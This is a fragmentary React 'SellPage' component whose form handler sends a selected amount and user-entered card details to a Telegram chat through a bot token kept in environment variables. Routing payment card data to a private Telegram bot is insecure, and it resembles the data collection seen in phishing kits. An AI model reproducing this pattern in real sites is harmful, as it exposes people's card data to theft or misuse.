...
export default function SellPage() {
  ...
  const handleSubmit = async (e) => {
    ...
    const token = process.env.Telegram_Sell;
    const chatId = process.env.Telegram_Sell_Id;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', `Selected Amount: ${selectedAmount}\nCard Details: ${formDetails.cardDetails}`);
  ...
  return (
      <div className="w-full h-full flex flex-col">
        ...
        <div className="flex justify-center">
          ...
          <form onSubmit={handleSubmit} className="flex flex-col gap-5 mt-8 p-4 sm:w-[45%] w-[90%] border-2
